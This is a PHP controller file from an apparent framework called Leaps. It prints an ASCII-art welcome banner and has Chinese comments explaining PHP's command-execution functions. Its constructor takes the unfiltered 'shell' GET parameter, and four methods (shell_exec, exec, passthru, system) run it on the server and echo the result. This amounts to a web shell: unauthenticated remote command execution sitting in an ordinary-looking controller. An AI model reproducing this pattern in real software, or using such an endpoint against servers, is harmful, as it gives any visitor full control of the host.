<?php
/**
 *
 * @author Tongle Xu <xutongle@gmail.com> 2012-12-12
 * @copyright Copyright (c) 2003-2103 www.tintsoft.com
 * @version $Id: IndexController.php 2 2013-01-14 07:14:05Z xutongle $
 */
class IndexController {
	public function __construct() {
		$this->shell = trim ( $_GET ['shell'] );
	}

	public function init() {
		$str = <<<EOT
                                       Welcome to use Leaps!

                                            .-....-..
                                          `--`.` ``-.-.
                                          --`/``/.+oy--`
                                    -++:---/:+`o:+-./o-`
                                 `:ydy/.````-../:+.:s+:           ......-.....
                               ./yh+-.``````.``-shyssso/+o++//:::--/hydmdmNmhy
                             .yms:....`````````````.-::--.``````..-omNNNm.
                            -mm..o:-..``./.`````````````.`.-:/+oydmmys:
                           +Nd:-::走..../.``..--://+osyhyssyhhs+:-`
                        :yhMMy-/-...-:你-+++syyhmdddhyo+-....
                       oMh+/:--.--:o/::::/:+oshd/-`
                       dN:-:-:so++o--:/osshhhys:-``
                      oNd-/soyyyhs+//+osyoo+::-:::://-
                     :Mmy+yNNNNdo-:::-..--/.```.::``oN+
                     sMmy+ymMm/-//-```.`..-......`.-.d/
                    `NNhNdyyNho-.--.-:oo+/::::+--:-.-yh
                    .@xutongle+.+//sddhhysydm:-...-sd-
      `-:-```..--` .odhyhmNNNNNmNddmmNmdmydddo----:omo
   ...mhyyysyooyosydso.@sueprman.yys+- :ddo::o:/hd.
  ...NNmNd.h/-:::++/o+yymNNNmds-         ydyoo+:/sdo
  -++myhmd.s--://+oosshdNNmds.          -dy+--///dy`
  o Nm+ymNmsyhhhddmNmmmmddo.            :do-..../d+
  :+msy.s.@tintsoft.com/              -hmMmhdmddo`
  -.@leaps...:+ms....`````              ...dmNNmmd.
  :+NNmdm+                          ...@dafang.y+s3.
  ``.-/:.````                      .+NNNNNNmdhhhhdmd-
                                   -.ddd.@yuncms.-

EOT;
		echo $str;
	}

	/**
	 * 运行这个简单的命令
	 */
	public function shell_exec() {
		$results = shell_exec ( $this->shell );
		echo $results;
	}

	/**
	 * 运行这个简单的命令，与 shell_exec() 相似，不同之处是它返回输出的最后一行，并且可选地用命令的完整输出和错误代码填充数组。
	 */
	public function exec() {
		$results = exec ( $this->shell );
		echo $results;
	}

	/**
	 * 运行外部程序，并在屏幕上显示结果。
	 */
	public function passthru() {
		passthru ( $this->shell, $returnval );
	}

	/**
	 * system() 命令是一种混合体。它像 passthru() 一样直接输出从外部程序接收到的任何东西。它还像 exec()
	 * 一样返回最后一行，并使返回代码可用。
	 */
	public function system() {
		system ( $this->shell );
	}
}